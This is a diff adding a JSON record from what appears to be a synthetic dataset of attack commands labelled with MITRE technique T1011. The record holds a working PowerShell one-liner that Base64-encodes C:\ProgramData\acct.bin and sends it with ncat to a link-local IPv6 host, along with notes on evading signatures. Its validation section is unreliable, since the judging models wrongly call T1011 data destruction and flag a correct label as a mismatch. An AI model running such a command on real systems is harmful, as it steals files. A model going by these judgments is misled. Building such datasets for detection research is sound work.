@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
+  "explanation": "Exfiltrates to a link-local IPv6 address on the Wi-Fi interface, using a local wireless medium distinct from primary routed channels. Data remains Base64-encoded, aligning with T1011's use of other network media.",
+  "rationale_steps": [
+    "Target a link-local IPv6 address on Wi-Fi to ensure a distinct network path.",
+    "Send Base64 data to an uncommon high TCP port to avoid typical service signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-aa6947e1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses, correct variable assignments, proper string formatting, and valid command chaining.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs data exfiltration via IPv6 over a Wi-Fi interface which aligns with T1011 (Exfiltration Over Other Network Medium), not T1485 (Data Destruction) as it doesn't destroy or render data unrecoverable.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T00:43:45.638008Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command uses correct syntax for variable assignment, cmdlet execution, method calls, string formatting, and piping, and `ncat.exe` arguments are valid.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration by reading a file and sending it over the network, which is entirely unrelated to T1011 Data Destruction, despite the explanation's incorrect claim of alignment.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T00:43:57.355828Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, correct separators, and valid ncat flags and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration over IPv6, not data destruction as described by the technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T00:44:10.375135Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
